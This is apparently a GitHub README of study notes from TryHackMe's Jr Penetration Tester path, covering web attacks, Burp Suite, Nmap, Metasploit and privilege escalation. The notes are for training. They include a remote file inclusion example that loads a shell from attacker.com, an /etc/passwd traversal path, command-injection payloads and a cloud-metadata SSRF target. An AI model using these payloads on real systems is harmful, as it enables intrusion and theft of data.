# 🔴 TryHackMe — Jr Penetration Tester Path

![Path](https://img.shields.io/badge/Path-Jr%20Penetration%20Tester-red?style=flat-square&logo=tryhackme)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=flat-square)
![Level](https://img.shields.io/badge/Level-Intermediate-orange?style=flat-square)

> Full notes and methodology from completing the **Jr Penetration Tester** path on TryHackMe.  
> This path covers the core skills needed to perform real-world penetration tests end-to-end.

---

## 📚 Path Structure

| Module | Topics | Status |
|--------|--------|--------|
| 🔍 Pentesting Fundamentals | Methodology, Ethics, Engagement Types | ✅ Done |
| 🌐 Introduction to Web Hacking | IDOR, File Inclusion, SSRF, XSS, SQLi, Command Injection | ✅ Done |
| 🛠️ Burp Suite | Proxy, Repeater, Intruder, Decoder, Comparer | ✅ Done |
| 🌍 Network Security | Passive & Active Recon, Nmap, Protocols | ✅ Done |
| 🔐 Vulnerability Research | CVE, Exploit-DB, Manual Research | ✅ Done |
| 💻 Metasploit | Modules, Payloads, Sessions, Post-Exploitation | ✅ Done |
| 🚩 Privilege Escalation | Linux & Windows Privesc Techniques | ✅ Done |

---

## 🔍 1. Pentesting Fundamentals

**Key concepts:**
- Penetration testing methodology: `Recon → Scan → Exploit → Post-Exploit → Report`
- Types of engagements: Black Box / Grey Box / White Box
- Rules of Engagement (ROE) and scoping
- Legal frameworks: written authorization is mandatory

---

## 🌐 2. Introduction to Web Hacking

### IDOR (Insecure Direct Object Reference)
- Manipulate object IDs in requests to access unauthorized resources
- Example: changing `/profile?id=100` to `/profile?id=101`

### File Inclusion
```
# Local File Inclusion (LFI)
?page=../../../../etc/passwd

# Remote File Inclusion (RFI)
?page=http://attacker.com/shell.php
```

### Command Injection
```bash
# Test payloads
; whoami
| whoami
&& whoami
`whoami`
$(whoami)
```

### SSRF (Server-Side Request Forgery)
- Trick the server into making requests to internal resources
- Target: `http://localhost/admin`, `http://169.254.169.254` (AWS metadata)

---

## 🛠️ 3. Burp Suite

**Core tools I use:**

| Tool | Purpose |
|------|---------|
| **Proxy** | Intercept and inspect HTTP traffic |
| **Repeater** | Manually modify and resend requests |
| **Intruder** | Automate attacks (brute force, fuzzing) |
| **Decoder** | Encode/decode Base64, URL, HTML |
| **Comparer** | Diff two requests/responses |

**Key workflow:** Intercept → Analyze → Send to Repeater → Test → Send to Intruder if needed

---

## 🌍 4. Network Security

### Passive Recon
```bash
whois <domain>          # Domain registration info
nslookup <domain>       # DNS lookup
dig <domain>            # Detailed DNS records
```

### Active Recon — Nmap
```bash
nmap -sV -sC <ip>                  # Version + default scripts
nmap -p- <ip>                      # All 65535 ports
nmap -sV --script vuln <ip>        # Vulnerability scan
nmap -A <ip>                       # Aggressive scan (OS + scripts)
```

---

## 🔐 5. Vulnerability Research

- **CVE** (Common Vulnerabilities and Exposures) — standard IDs for known vulns
- **Exploit-DB** — public exploit database (`searchsploit` in terminal)
- **NVD** — NIST National Vulnerability Database

```bash
searchsploit <service> <version>   # Find public exploits
searchsploit -m <exploit-id>       # Copy exploit to current dir
```

---

## 💻 6. Metasploit

```bash
msfconsole                         # Start Metasploit
search <service/cve>               # Find a module
use <module>                       # Select module
show options                       # View required options
set RHOSTS <ip>                    # Set target
set LHOST <your-ip>                # Set listener
run / exploit                      # Execute
```

**Post-exploitation:**
```bash
sessions -l                        # List active sessions
sessions -i 1                      # Interact with session
getuid                             # Current user
sysinfo                            # System info
```

---

## 🚩 7. Privilege Escalation

### Linux Privesc
```bash
sudo -l                            # Check sudo permissions
find / -perm -4000 2>/dev/null     # Find SUID binaries
cat /etc/crontab                   # Check cron jobs
env                                # Check environment variables
```

### Windows Privesc
```powershell
whoami /priv                       # Check privileges
net user                           # List users
Get-Service                        # List services
reg query HKLM\Software\...        # Query registry
```

**Key vectors covered:**
- SUID / SGID binaries
- Sudo misconfigurations
- Cron jobs
- Weak file permissions
- Unquoted service paths (Windows)
- SeImpersonatePrivilege (Windows)

---

## 🎯 Key Takeaway

> The Jr Pentester path changed how I think about systems. It's not about running tools — it's about understanding **why** something is vulnerable, **how** to exploit it methodically, and **what** a defender needs to fix.

---

## 🔗 Connect

[![TryHackMe](https://img.shields.io/badge/TryHackMe-NEPHOS-red?style=flat-square&logo=tryhackme)](https://tryhackme.com/p/NEPHOS)
[![GitHub](https://img.shields.io/badge/GitHub-obadahamed-181717?style=flat-square&logo=github)](https://github.com/obadahamed)
